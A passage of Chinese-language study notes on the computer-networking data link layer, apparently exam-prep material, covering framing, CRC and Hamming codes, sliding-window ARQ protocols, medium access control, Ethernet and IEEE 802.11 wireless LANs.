<li>若不限制发送方发送速率，来不及接收的帧会被后续帧“淹没”，造成帧丢失出错。</li>
</ul>
</li>
<li>目的<ul>
<li>限制发送方发送速率，不超过接收方接收能力。</li>
</ul>
</li>
<li>实现方式<ul>
<li>通过某种反馈机制。</li>
<li>使发送方知晓何时可接着发送下一帧。</li>
<li>使发送方知晓何时必须暂停发送，等待反馈信息后继续发送。</li>
</ul>
</li>
<li>不同体系结构中的情况<ul>
<li>OSI体系结构<ul>
<li>数据链路层具有流量控制功能。</li>
<li>控制对象是相邻节点之间数据链路上的流量。</li>
</ul>
</li>
<li>TCP&#x2F;IP体系结构<ul>
<li>流量控制功能移到传输层。</li>
<li>控制对象是从源端到目的端之间的流量。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-1-6-差错检测"><a href="#3-1-6-差错检测" class="headerlink" title="3.1.6   差错检测"></a>3.1.6   差错检测</h3><ul>
<li>传输错误原因<ul>
<li>信道噪声导致帧传输错误</li>
</ul>
</li>
<li>错误类型<ul>
<li>位错<ul>
<li>定义：帧中某些位出现差错</li>
<li>检测方法：循环冗余检验(CRC)</li>
</ul>
</li>
<li>帧错<ul>
<li>类型<ul>
<li>帧丢失</li>
<li>帧重复</li>
<li>帧失序</li>
</ul>
</li>
<li>性质：都属于传输差错</li>
</ul>
</li>
</ul>
</li>
<li>历史处理方式(OSI观点)<ul>
<li>要求数据链路层提供可靠传输</li>
<li>实现机制<ul>
<li>在CRC检错基础上增加<ul>
<li>帧编号</li>
<li>确认机制</li>
<li>重传机制</li>
</ul>
</li>
<li>工作流程<ul>
<li>接收方收到正确帧后发送确认</li>
<li>发送方未收到确认时重传</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>现代应用场景<ul>
<li>无线传输(通信质量差)<ul>
<li>仍使用确认和重传机制</li>
<li>向上提供可靠传输服务</li>
</ul>
</li>
<li>有线链路(通信质量好)<ul>
<li>不再使用确认和重传机制</li>
<li>仅进行CRC检错<ul>
<li>处理方式：丢弃有差错帧</li>
<li>目的：保证上交帧都正确</li>
</ul>
</li>
<li>重传任务转移<ul>
<li>由高层协议完成</li>
<li>例如：传输层TCP协议</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="3-2-组帧"><a href="#3-2-组帧" class="headerlink" title="3.2   组帧"></a>3.2   组帧</h2><h3 id="3-2-1-字符计数法"><a href="#3-2-1-字符计数法" class="headerlink" title="3.2.1   字符计数法"></a>3.2.1   字符计数法</h3><ul>
<li>定义<ul>
<li>在帧首部使用计数字段记录该帧所含字节数</li>
<li>包括计数字段自身占用的1字节</li>
</ul>
</li>
<li>工作原理<ul>
<li>接收方读取帧首部的字节计数值</li>
<li>根据计数值确定帧结束位置</li>
<li>连续传输特性可确定下一帧开始位置</li>
</ul>
</li>
<li>主要问题<ul>
<li>计数字段出错会导致帧边界划分失败</li>
<li>后果<ul>
<li>无法判断帧结束位</li>
<li>无法确定下一帧开始位</li>
<li>收发双方失去同步</li>
<li>造成灾难性后果</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-2-2-字节填充法"><a href="#3-2-2-字节填充法" class="headerlink" title="3.2.2   字节填充法"></a>3.2.2   字节填充法</h3><ul>
<li>定界方法<ul>
<li>使用特定字节定界帧的开始与结束</li>
<li>SOH: 帧开始控制字符</li>
<li>EOT: 帧结束控制字符</li>
</ul>
</li>
<li>特殊字符处理<ul>
<li>在特殊字符前填充转义字符ESC</li>
<li>防止误判为帧首尾定界符</li>
<li>转义字符是ASCII控制字符(单个字符)</li>
</ul>
</li>
<li>发送方处理<ul>
<li>数据段出现EOT&#x2F;SOH时<ul>
<li>插入ESC字符</li>
</ul>
</li>
<li>ESC出现在数据中时<ul>
<li>在ESC前再插入ESC</li>
</ul>
</li>
</ul>
</li>
<li>接收方处理<ul>
<li>收到转义字符后<ul>
<li>知道后面是数据信息</li>
</ul>
</li>
<li>删除插入的ESC字符<ul>
<li>恢复原始数据</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-2-3-零比特填充法"><a href="#3-2-3-零比特填充法" class="headerlink" title="3.2.3   零比特填充法"></a>3.2.3   零比特填充法</h3><ul>
<li>基本原理<ul>
<li>允许数据帧包含任意个数的比特</li>
<li>使用特定比特串01111110标志帧的开始和结束</li>
</ul>
</li>
<li>发送方处理流程<ul>
<li>扫描整个数据字段</li>
<li>每遇到5个连续的”1”<ul>
<li>自动在其后插入一个”0”</li>
</ul>
</li>
<li>保证数据字段中不会出现6个连续的”1”</li>
</ul>
</li>
<li>接收方处理流程<ul>
<li>执行逆操作</li>
<li>每收到5个连续的”1”<ul>
<li>自动删除后面紧跟的”0”</li>
</ul>
</li>
<li>恢复原始数据</li>
</ul>
</li>
<li>应用实例<ul>
<li>数据链路层早期使用的HDLC协议</li>
<li>采用这种比特填充的首尾标志法</li>
<li>实现透明传输</li>
</ul>
</li>
<li>特点<ul>
<li>容易由硬件实现</li>
<li>性能优于字节填充法</li>
</ul>
</li>
</ul>
<h3 id="3-2-4-违规编码法"><a href="#3-2-4-违规编码法" class="headerlink" title="3.2.4   违规编码法"></a>3.2.4   违规编码法</h3><ul>
<li><p>违规编码法</p>
<ul>
<li>示例：曼彻斯特编码<ul>
<li>数据比特”1”编码为”高-低”电平对</li>
<li>数据比特”0”编码为”低-高”电平对</li>
<li>违规编码序列<ul>
<li>“高-高”电平对</li>
<li>“低-低”电平对</li>
</ul>
</li>
</ul>
</li>
<li>应用<ul>
<li>用于定界帧的起始和终止</li>
<li>局域网IEEE 802标准采用</li>
</ul>
</li>
<li>特点<ul>
<li>无需填充技术实现透明传输</li>
<li>仅适用于冗余编码的特殊编码环境</li>
</ul>
</li>
</ul>
</li>
<li><p>组帧方法比较</p>
<ul>
<li>字符计数法<ul>
<li>缺点：计数字段脆弱</li>
</ul>
</li>
<li>字节填充法<ul>
<li>缺点<ul>
<li>实现复杂</li>
<li>存在不兼容性</li>
</ul>
</li>
</ul>
</li>
<li>常用方法<ul>
<li>零比特填充法</li>
<li>违规编码法</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="3-3-差错控制"><a href="#3-3-差错控制" class="headerlink" title="3.3   差错控制"></a>3.3   差错控制</h2><h3 id="3-3-1-检错编码"><a href="#3-3-1-检错编码" class="headerlink" title="3.3.1   检错编码"></a>3.3.1   检错编码</h3><ul>
<li>核心思想<ul>
<li>冗余编码技术</li>
<li>有效数据+冗余位构成码字</li>
<li>接收方根据规则判断是否出错</li>
</ul>
</li>
<li>常见检错编码<ul>
<li>奇偶检验码<ul>
<li>组成：n-1位数据 + 1位检验位</li>
<li>类型<ul>
<li>奇检验码：1的个数为奇数</li>
<li>偶检验码：1的个数为偶数</li>
</ul>
</li>
<li>特点<ul>
<li>只能检测奇数位出错</li>
<li>不能定位错误位</li>
<li>不能发现偶数位出错</li>
</ul>
</li>
</ul>
</li>
<li>循环冗余码(CRC)<ul>
<li>基本思想<ul>
<li>约定生成多项式G(x)</li>
<li>发送方计算并附加冗余码</li>
<li>接收方通过G(x)检验差错</li>
</ul>
</li>
<li>帧检验序列(FCS)<ul>
<li>m位数据 + r位冗余码</li>
<li>帧能被G(x)整除</li>
</ul>
</li>
<li>计算步骤<br>①. 加0：数据后加r个0<br>②. 模2除：用G(x)二进制串除数据串</li>
<li>模2运算规则<ul>
<li>加法不进位</li>
<li>减法不借位</li>
<li>对应位逻辑异或</li>
</ul>
</li>
<li>特点<ul>
<li>硬件实现快速</li>
<li>无差错时余数为0</li>
<li>误码时余数为0概率极低</li>
</ul>
</li>
<li>数据链路层应用<ul>
<li>仅使用检错功能</li>
<li>检测出错直接丢弃</li>
<li>不实现纠错功能</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-3-2-纠错编码"><a href="#3-3-2-纠错编码" class="headerlink" title="3.3.2   纠错编码"></a>3.3.2   纠错编码</h3><ul>
<li>海明码<ul>
<li>实现原理<ul>
<li>在有效信息位中加入检验位形成海明码</li>
<li>把海明码的每个二进制位分配到几个奇偶检验组中</li>
<li>某一位出错会引起相关检验位变化</li>
<li>可以发现错位并指出位置</li>
</ul>
</li>
</ul>
</li>
<li>码距<ul>
<li>定义<ul>
<li>两个码字对应位取值不同的比特数量</li>
<li>计算方法：对两个位串进行异或运算，结果中1的个数</li>
</ul>
</li>
<li>编码集码距<ul>
<li>任意两个码字的码距的最小值</li>
</ul>
</li>
<li>纠错理论<ul>
<li>关系式：1&#x3D;d+c+1, d≥c</li>
<li>码距越大，检错位数d和纠错位数c越大</li>
<li>纠错能力≤检错能力</li>
</ul>
</li>
<li>结论<ul>
<li>检测d位错误需要码距d+1</li>
<li>纠正c位错误需要码距2c+1</li>
</ul>
</li>
</ul>
</li>
<li>海明码编码过程<ul>
<li>确定海明码位数<ul>
<li>满足2^k≥n+k+1</li>
</ul>
</li>
<li>检验位分布<ul>
<li>P_i位于海明位号2^(i-1)的位置</li>
</ul>
</li>
<li>分组形成检验关系<ul>
<li>D1由P2P1检验</li>
<li>D2由P3P1检验</li>
<li>D3由P3P2检验</li>
<li>D4由P3P2P1检验</li>
</ul>
</li>
<li>检验位取值<ul>
<li>第i组所有位求异或</li>
</ul>
</li>
<li>检验原理<ul>
<li>检验方程：<ul>
<li>S1&#x3D;P1⊕D1⊕D2⊕D4</li>
<li>S2&#x3D;P2⊕D1⊕D3⊕D4</li>
<li>S3&#x3D;P3⊕D2⊕D3⊕D4</li>
</ul>
</li>
<li>判断：<ul>
<li>S3S2S1&#x3D;000表示无错</li>
<li>否则数值表示错误位号</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="3-4-流量控制与可靠传输机制"><a href="#3-4-流量控制与可靠传输机制" class="headerlink" title="3.4   流量控制与可靠传输机制"></a>3.4   流量控制与可靠传输机制</h2><h3 id="3-4-1-流量控制与滑动窗口机制"><a href="#3-4-1-流量控制与滑动窗口机制" class="headerlink" title="3.4.1    流量控制与滑动窗口机制"></a>3.4.1    流量控制与滑动窗口机制</h3><ul>
<li>流量控制定义<ul>
<li>由接收方控制发送方的发送速率</li>
<li>确保接收方有足够的缓冲空间接收每个帧</li>
</ul>
</li>
<li>流量控制方法<ul>
<li>停止-等待协议</li>
<li>滑动窗口协议</li>
</ul>
</li>
<li>数据链路层与传输层流量控制的区别<ul>
<li><ol>
<li>控制范围</li>
</ol>
<ul>
<li>数据链路层：相邻节点之间</li>
<li>传输层：端到端</li>
</ul>
</li>
<li><ol start="2">
<li>控制手段</li>
</ol>
<ul>
<li>数据链路层：接收方收不下时不返回确认</li>
<li>传输层：通过确认报文段中的窗口值调整发送窗口</li>
</ul>
</li>
</ul>
</li>
<li>停止-等待流量控制<ul>
<li>基本原理<ul>
<li>发送方每次只发送一个帧</li>
<li>接收方反馈确认信号后才能发送下一帧</li>
<li>未收到确认则一直等待</li>
</ul>
</li>
<li>特点<ul>
<li>传输效率较低</li>
</ul>
</li>
</ul>
</li>
<li>滑动窗口流量控制<ul>
<li>基本原理<ul>
<li>发送窗口：允许发送的连续帧序号</li>
<li>接收窗口：允许接收的连续帧序号</li>
</ul>
</li>
<li>窗口滑动机制<ul>
<li>发送方：收到按序确认后窗口前滑</li>
<li>接收方：收到落入窗口的帧后前滑并确认</li>
</ul>
</li>
<li>重要特性<ul>
<li><ol>
<li>接收窗口前滑是发送窗口前滑的前提</li>
</ol>
</li>
<li><ol start="2">
<li>不同协议的窗口大小差异</li>
</ol>
<ul>
<li>停止-等待协议：WT&#x3D;1, WR&#x3D;1</li>
<li>后退N帧协议：WT&gt;1, WR&#x3D;1</li>
<li>选择重传协议：WT&gt;1, WR&gt;1</li>
<li>若采用n比特编号：WT+WR≤2ⁿ</li>
</ul>
</li>
<li><ol start="3">
<li>WR&#x3D;1时可保证有序接收</li>
</ol>
</li>
<li><ol start="4">
<li>数据链路层窗口大小固定</li>
</ol>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-4-2-可靠传输机制"><a href="#3-4-2-可靠传输机制" class="headerlink" title="3.4.2    可靠传输机制"></a>3.4.2    可靠传输机制</h3><ul>
<li>定义<ul>
<li>发送方发送的数据都能被接收方正确地接收</li>
</ul>
</li>
<li>实现机制<ul>
<li>确认机制<ul>
<li>接收方向发送方发回确认帧</li>
</ul>
</li>
<li>超时重传机制<ul>
<li>发送方启动计时器，超时未收到确认则重传</li>
</ul>
</li>
</ul>
</li>
<li>自动重传请求(ARQ)协议<ul>
<li>特点<ul>
<li>重传自动进行</li>
<li>数据帧和确认帧必须编号</li>
</ul>
</li>
<li>分类<ul>
<li>停止-等待协议(S-W)</li>
<li>后退N帧协议(GBN)</li>
<li>选择重传协议(SR)</li>
</ul>
</li>
<li>应用范围<ul>
<li>不仅限于数据链路层</li>
</ul>
</li>
</ul>
</li>
<li>有线网络与无线网络的差异<ul>
<li>有线网络<ul>
<li>误码率低</li>
<li>可靠传输由上层处理</li>
</ul>
</li>
<li>无线网络<ul>
<li>误码率高</li>
<li>数据链路层提供可靠传输</li>
</ul>
</li>
</ul>
</li>
<li>①. 单帧滑动窗口与停止-等待协议(S-W)<ul>
<li>工作原理<ul>
<li>发送窗口&#x3D;1，接收窗口&#x3D;1</li>
<li>收到确认后才能发送下一帧</li>
</ul>
</li>
<li>差错处理<ul>
<li>数据帧出错&#x2F;丢失<ul>
<li>接收方丢弃</li>
<li>发送方超时重传</li>
</ul>
</li>
<li>确认帧出错&#x2F;丢失<ul>
<li>发送方重传</li>
<li>接收方丢弃重复帧并重发确认</li>
</ul>
</li>
</ul>
</li>
<li>帧编号<ul>
<li>1比特编号(0&#x2F;1交替)</li>
</ul>
</li>
<li>缓冲区设置<ul>
<li>发送方保留副本直到收到确认</li>
</ul>
</li>
<li>信道利用率<ul>
<li>低</li>
</ul>
</li>
</ul>
</li>
<li>②. 多帧滑动窗口与后退N帧协议(GBN)<ul>
<li>工作原理<ul>
<li>发送窗口&gt;1</li>
<li>累积确认机制</li>
<li>按序接收</li>
</ul>
</li>
<li>帧编号<ul>
<li>n比特编号</li>
<li>发送窗口限制：1&lt;WT≤2ⁿ-1</li>
</ul>
</li>
<li>接收窗口<ul>
<li>WR&#x3D;1</li>
</ul>
</li>
<li>效率问题<ul>
<li>重传正确到达的帧</li>
</ul>
</li>
</ul>
</li>
<li>③. 多帧滑动窗口与选择重传协议(SR)<ul>
<li>工作原理<ul>
<li>选择性重传</li>
<li>接收窗口&gt;1</li>
<li>逐一确认</li>
</ul>
</li>
<li>帧编号<ul>
<li>n比特编号</li>
<li>窗口限制<ul>
<li>WR+WT≤2ⁿ</li>
<li>WR≤WT</li>
<li>WR≤2ⁿ⁻¹</li>
</ul>
</li>
</ul>
</li>
<li>差错处理<ul>
<li>否定帧NAK</li>
</ul>
</li>
</ul>
</li>
<li>④. 信道利用率的分析<ul>
<li>定义<ul>
<li>有效发送时间&#x2F;发送周期</li>
</ul>
</li>
<li>停止-等待协议<ul>
<li>计算公式<ul>
<li>U&#x3D;Tp&#x2F;(Tp+RTT+TA)</li>
</ul>
</li>
<li>特点<ul>
<li>利用率低</li>
</ul>
</li>
</ul>
</li>
<li>连续ARQ协议<ul>
<li>流水线传输</li>
<li>两种情况<br>①. nTp&lt;Tp+RTT+TA<ul>
<li>U&#x3D;nTp&#x2F;(Tp+RTT+TA)<br>②. nTp≥Tp+RTT+TA</li>
<li>U&#x3D;1</li>
</ul>
</li>
</ul>
</li>
<li>数据传输速率计算<ul>
<li>信道平均速率&#x3D;利用率×带宽</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="3-5-介质访问控制"><a href="#3-5-介质访问控制" class="headerlink" title="3.5   介质访问控制"></a>3.5   介质访问控制</h2><h3 id="3-5-1-信道划分介质访问控制"><a href="#3-5-1-信道划分介质访问控制" class="headerlink" title="3.5.1   信道划分介质访问控制"></a>3.5.1   信道划分介质访问控制</h3><ul>
<li>定义<ul>
<li>将使用同一传输介质的多个设备的通信隔离开来</li>
<li>通过复用技术实现</li>
<li>复用原理：发送端组合信号，接收端分离信号</li>
</ul>
</li>
<li>实质<ul>
<li>通过分时、分频、分码等方法</li>
<li>将广播信道转变为点对点信道</li>
</ul>
</li>
<li>分类<ul>
<li>频分复用 (FDM)<ul>
<li>原理：将总频带划分为多个子频带</li>
<li>特点：所有用户在同一时间占用不同频带</li>
<li>优点：充分利用带宽，系统效率高</li>
</ul>
</li>
<li>时分复用 (TDM)<ul>
<li>原理：将传输时间划分为TDM帧</li>
<li>特点：固定时隙分配，周期性出现</li>
<li>缺点：信道利用率不高</li>
<li>改进：统计时分复用 (STDM)<ul>
<li>动态分配时隙</li>
<li>提高线路利用率</li>
</ul>
</li>
</ul>
</li>
<li>波分复用 (WDM)<ul>
<li>原理：光的频分复用</li>
<li>特点：不同波长光信号互不干扰</li>
<li>应用：光纤通信</li>
</ul>
</li>
<li>码分复用 (CDM)<ul>
<li>原理：采用不同编码区分信号</li>
<li>特点：共享频率和时间</li>
<li>码分多址 (CDMA)<ul>
<li>码片序列</li>
<li>正交性要求</li>
<li>数据分离计算</li>
</ul>
</li>
<li>优点<ul>
<li>频谱利用率高</li>
<li>抗干扰能力强</li>
<li>保密性强</li>
</ul>
</li>
<li>应用：无线通信系统</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-5-2-随机访问介质访问控制"><a href="#3-5-2-随机访问介质访问控制" class="headerlink" title="3.5.2   随机访问介质访问控制"></a>3.5.2   随机访问介质访问控制</h3><ul>
<li>核心思想<ul>
<li>胜利者通过争用获得信道，进而获得信息的发送权</li>
<li>随机访问介质访问控制协议也称争用型协议</li>
</ul>
</li>
<li>特点<ul>
<li>不采用集中控制方式</li>
<li>所有用户随机发送信息</li>
<li>可能产生帧冲突</li>
</ul>
</li>
<li>机制<ul>
<li>广播信道转换为点到点信道的机制</li>
</ul>
</li>
<li>1.ALOHA协议<ul>
<li>纯ALOHA协议<ul>
<li>基本思想<ul>
<li>不进行任何检测就发送数据</li>
<li>未收到确认则认为发生冲突</li>
<li>等待随机时间后重发</li>
</ul>
</li>
<li>工作原理<ul>
<li>帧长用发送时间T₀表示</li>
<li>冲突后等待随机时间重传</li>
</ul>
</li>
<li>缺点<ul>
<li>吞吐量低</li>
</ul>
</li>
</ul>
</li>
<li>时隙ALOHA协议<ul>
<li>改进<ul>
<li>时间划分为等长时隙</li>
<li>只能在时隙开始时发送</li>
</ul>
</li>
<li>优点<ul>
<li>降低冲突概率</li>
<li>提高信道利用率</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>2.CSMA协议<ul>
<li>改进点<ul>
<li>发送前监听信道</li>
</ul>
</li>
<li>三种类型<ul>
<li>1-坚持CSMA<ul>
<li>信道空闲立即发送</li>
<li>信道忙持续监听</li>
</ul>
</li>
<li>非坚持CSMA<ul>
<li>信道忙放弃监听</li>
<li>随机时间后重新监听</li>
</ul>
</li>
<li>p-坚持CSMA<ul>
<li>时分信道适用</li>
<li>概率p发送数据</li>
<li>概率1-p推迟</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>3.CSMA&#x2F;CD协议<ul>
<li>特点(2015)<ul>
<li>适用于总线形网络或半双工网络</li>
<li>全双工网络不需要</li>
</ul>
</li>
<li>工作流程<ul>
<li>先听后发</li>
<li>边听边发</li>
<li>冲突停发</li>
<li>随机重发</li>
</ul>
</li>
<li>最短帧长<ul>
<li>计算公式<ul>
<li>最短帧长&#x3D;最大单向传播时延×数据传输速率×2</li>
</ul>
</li>
<li>以太网规定<ul>
<li>争用期51.2 μs</li>
<li>10Mb&#x2F;s以太网最短帧长64B</li>
</ul>
</li>
</ul>
</li>
<li>二进制指数退避算法(2023)<ul>
<li>基本退避时间2t</li>
<li>随机数r从[0,1,…,(2^k-1)]选取</li>
<li>重传推迟时间2rt</li>
<li>重传16次失败则丢弃</li>
</ul>
</li>
</ul>
</li>
<li>4.CSMA&#x2F;CA协议<ul>
<li>改进原因<ul>
<li>无线信号强度变化大</li>
<li>隐蔽站问题</li>
</ul>
</li>
<li>确认机制(2011)<ul>
<li>使用链路层确认&#x2F;重传(ARQ)</li>
</ul>
</li>
<li>帧间间隔(2020)<ul>
<li>SIFS（最短）</li>
<li>PIFS（中等）</li>
<li>DIFS（最长）</li>
</ul>
</li>
<li>隐蔽站问题处理<ul>
<li>RTS和CTS预约</li>
</ul>
</li>
<li>与CSMA&#x2F;CD区别<ul>
<li>CSMA&#x2F;CD可检测冲突</li>
<li>CSMA&#x2F;CA尽量避免冲突</li>
<li>传输介质不同</li>
<li>检测方式不同</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-5-3-轮询访问：令牌传递协议"><a href="#3-5-3-轮询访问：令牌传递协议" class="headerlink" title="3.5.3   轮询访问：令牌传递协议"></a>3.5.3   轮询访问：令牌传递协议</h3><ul>
<li><p>定义</p>
<ul>
<li>用户不能随机发送信息</li>
<li>通过集中控制的监控站循环轮询每个节点</li>
<li>决定信道分配</li>
</ul>
</li>
<li><p>令牌传递协议</p>
<ul>
<li>令牌特性<ul>
<li>特殊控制帧</li>
<li>不包含信息</li>
<li>控制信道使用</li>
<li>确保同一时刻只有一个站独占信道</li>
</ul>
</li>
<li>工作流程<ul>
<li>站点必须等待令牌才能发送帧</li>
<li>发送完成后释放令牌</li>
<li>令牌按顺序依次传递</li>
</ul>
</li>
<li>优点<ul>
<li>不会发生冲突</li>
<li>访问权公平</li>
</ul>
</li>
</ul>
</li>
<li><p>令牌环网络工作过程</p>
<ul>
<li>网络空闲时只有令牌帧循环传递</li>
<li>有数据要发送的站点<ul>
<li>修改令牌标志位</li>
<li>附加传输数据</li>
<li>将令牌变成数据帧发送</li>
</ul>
</li>
<li>数据帧传输过程<ul>
<li>站点转发数据</li>
<li>检查目的地址</li>
<li>地址匹配则复制数据帧</li>
</ul>
</li>
<li>数据帧返回源站点<ul>
<li>源站点停止转发</li>
<li>检验传输错误</li>
<li>出错则重传</li>
</ul>
</li>
<li>传输完成后<ul>
<li>重新产生令牌</li>
<li>传递给下一站点</li>
<li>交出信道控制权</li>
</ul>
</li>
</ul>
</li>
<li><p>协议特点</p>
<ul>
<li>适合高负载广播信道</li>
<li>不共享时间和空间</li>
<li>限定有权发送数据的节点只能有一个</li>
</ul>
</li>
<li><p>数据链路层特性</p>
<ul>
<li>通过介质访问控制机制</li>
<li>将广播信道变为逻辑点对点信道</li>
<li>研究</li>
</ul>
</li>
</ul>
<h2 id="3-6-局域网"><a href="#3-6-局域网" class="headerlink" title="3.6   局域网"></a>3.6   局域网</h2><h3 id="3-6-1-局域网的基本概念和体系结构"><a href="#3-6-1-局域网的基本概念和体系结构" class="headerlink" title="3.6.1   局域网的基本概念和体系结构"></a>3.6.1   局域网的基本概念和体系结构</h3><ul>
<li>局域网(LAN)定义<ul>
<li>较小地理范围内</li>
<li>连接计算机、外部设备和数据库系统</li>
<li>资源和信息共享</li>
</ul>
</li>
<li>主要特点<ul>
<li><ol>
<li>单位所有，地理范围和站点数量有限</li>
</ol>
</li>
<li><ol start="2">
<li>共享较高总带宽</li>
</ol>
</li>
<li><ol start="3">
<li>低时延和低误码率</li>
</ol>
</li>
<li><ol start="4">
<li>站点平等关系</li>
</ol>
</li>
<li><ol start="5">
<li>能进行广播和多播</li>
</ol>
</li>
</ul>
</li>
<li>决定因素<ul>
<li>拓扑结构</li>
<li>传输介质</li>
<li>介质访问控制方式（最重要）</li>
</ul>
</li>
<li>常见拓扑结构<ul>
<li>① 星形结构</li>
<li>② 环形结构</li>
<li>③ 总线形结构</li>
<li>④ 星形和总线形结合的复合型结构</li>
</ul>
</li>
<li>传输介质<ul>
<li>铜缆</li>
<li>双绞线（主流）</li>
<li>光纤</li>
</ul>
</li>
<li>介质访问控制方法<ul>
<li>CSMA&#x2F;CD协议（总线形）</li>
<li>令牌总线协议（总线形）</li>
<li>令牌环协议（环形）</li>
</ul>
</li>
<li>特殊局域网拓扑实现<ul>
<li>以太网<ul>
<li>逻辑拓扑：总线形</li>
<li>物理拓扑：星形</li>
</ul>
</li>
<li>令牌环(IEEE 802.5)<ul>
<li>逻辑拓扑：环形</li>
<li>物理拓扑：星形</li>
</ul>
</li>
<li>FDDI(IEEE 802.8)<ul>
<li>逻辑拓扑：环形</li>
<li>物理拓扑：双环结构</li>
</ul>
</li>
</ul>
</li>
<li>IEEE802参考模型<ul>
<li>对应OSI的数据链路层和物理层</li>
<li>数据链路层子层<ul>
<li>逻辑链路控制(LLC)子层<ul>
<li>与传输介质无关</li>
<li>提供四种连接服务类型<ul>
<li>无确认无连接</li>
<li>面向连接</li>
<li>带确认无连接</li>
<li>高速传送</li>
</ul>
</li>
</ul>
</li>
<li>介质访问控制(MAC)子层<ul>
<li>屏蔽物理层访问差异</li>
<li>主要功能<ul>
<li>组帧和拆卸帧</li>
<li>比特传输差错检测</li>
<li>透明传输</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>现状<ul>
<li>以太网垄断市场</li>
<li>许多网卡仅装MAC协议</li>
</ul>
</li>
</ul>
<h3 id="3-6-2-以太网与IEEE-802-3"><a href="#3-6-2-以太网与IEEE-802-3" class="headerlink" title="3.6.2    以太网与IEEE  802.3"></a>3.6.2    以太网与IEEE  802.3</h3><ul>
<li>以太网概述<ul>
<li>最流行的有线局域网技术</li>
<li>发展历史<ul>
<li>DIX V1（DEC、Intel、Xerox联合提出）</li>
<li>DIX Ethernet V2（第一个局域网产品规约）</li>
<li>IEEE 802.3标准（基于DIX Ethernet V2）</li>
</ul>
</li>
</ul>
</li>
<li>以太网特点<ul>
<li>无连接工作方式<ul>
<li>不编号、不确认</li>
<li>尽最大努力交付（不可靠服务）</li>
<li>差错纠正由高层完成</li>
</ul>
</li>
<li>曼彻斯特编码<ul>
<li>中间电压转换</li>
<li>便于位同步提取</li>
</ul>
</li>
</ul>
</li>
<li>①. 传输介质与网卡<ul>
<li>传输介质类型<ul>
<li>粗缆</li>
<li>细缆</li>
<li>双绞线</li>
<li>光纤</li>
</ul>
</li>
<li>网络适配器（网卡）<ul>
<li>功能<ul>
<li>串并转换</li>
<li>物理连接与电信号匹配</li>
<li>帧处理（发送&#x2F;接收、封装&#x2F;拆封）</li>
<li>介质访问控制</li>
<li>编码&#x2F;解码</li>
<li>数据缓存</li>
</ul>
</li>
<li>工作方式<ul>
<li>与局域网：串行通信</li>
<li>与计算机：并行通信（通过I&#x2F;O总线）</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>②. MAC地址<ul>
<li>特点<ul>
<li>48位全球地址</li>
<li>固化在适配器ROM中</li>
<li>地理位置无关</li>
</ul>
</li>
<li>格式<ul>
<li>6字节（12位十六进制）</li>
<li>高24位：厂商代码</li>
<li>低24位：适配器序列号</li>
</ul>
</li>
<li>帧接收规则<ul>
<li>单播帧（目的地址&#x3D;本站地址）</li>
<li>广播帧（全1地址）</li>
<li>多播帧（部分站点）</li>
</ul>
</li>
</ul>
</li>
<li>③. MAC帧格式<ul>
<li>以太网V2标准<ul>
<li>前导码（8字节）<ul>
<li>前同步码（7字节）</li>
<li>帧开始定界符（1字节）</li>
</ul>
</li>
<li>帧结构<ul>
<li>目的地址（6字节）</li>
<li>源地址（6字节）</li>
<li>类型（2字节）</li>
<li>数据（46-1500字节）</li>
<li>FCS（4字节）</li>
</ul>
</li>
</ul>
</li>
<li>与802.3帧区别<ul>
<li>长度域替代类型域</li>
<li>长度&#x2F;类型并存机制</li>
</ul>
</li>
</ul>
</li>
<li>④. 高速以太网<ul>
<li>100BASE-T（快速以太网）<ul>
<li>100Mb&#x2F;s速率</li>
<li>保持802.3帧格式</li>
<li>最大网段长度：100m</li>
<li>帧间间隔：0.96μs</li>
</ul>
</li>
<li>吉比特以太网<ul>
<li>1Gb&#x2F;s速率</li>
<li>兼容10&#x2F;100BASE-T</li>
<li>全双工&#x2F;半双工</li>
</ul>
</li>
<li>10吉比特以太网<ul>
<li>10Gb&#x2F;s速率</li>
<li>保持最小&#x2F;最大帧长</li>
<li>仅全双工工作</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-6-3-IEEE-802-11无线局域网"><a href="#3-6-3-IEEE-802-11无线局域网" class="headerlink" title="3.6.3   IEEE  802.11无线局域网"></a>3.6.3   IEEE  802.11无线局域网</h3><ul>
<li>①. 无线局域网的组成<ul>
<li>(1)有固定基础设施无线局域网<ul>
<li>IEEE 802.11系列协议标准（802.1la&#x2F;b&#x2F;g&#x2F;n等）</li>
<li>星形拓扑，中心为接入点（AP）</li>
<li>MAC层使用CSMA&#x2F;CA协议</li>
<li>基本服务集（BSS）<ul>
<li>组成：一个AP和若干移动站</li>
<li>通信必须通过AP</li>
<li>服务集标识符（SSID）和信道</li>
<li>基本服务区（BSA），直径一般不超过100m</li>
</ul>
</li>
<li>扩展服务集（ESS）<ul>
<li>通过分配系统（DS）连接多个BSS</li>
<li>通过Portal设备提供有线以太网接入</li>
</ul>
</li>
<li>移动站漫游</li>
</ul>
</li>
<li>(2)无固定基础设施移动自组织网络<ul>
<li>自组网络（ad hoc network）</li>
<li>平等状态的移动站组成临时网络</li>
<li>每个移动站参与路由发现和维护</li>
<li>与移动IP的区别</li>
</ul>
</li>
</ul>
</li>
<li>②. 802.11局域网的MAC帧<ul>
<li>帧类型：数据帧、控制帧、管理帧</li>
<li>数据帧格式<ul>
<li>MAC首部（30字节）</li>
<li>帧主体（不超过2312字节）</li>
<li>帧检验序列FCS（4字节）</li>
</ul>
</li>
<li>MAC首部地址字段<ul>
<li>地址1：直接接收数据帧的节点地址</li>
<li>地址2：实际发送数据帧的节点地址</li>
<li>地址3：实际目的地址或源地址</li>
<li>地址4：用于自组网络</li>
</ul>
</li>
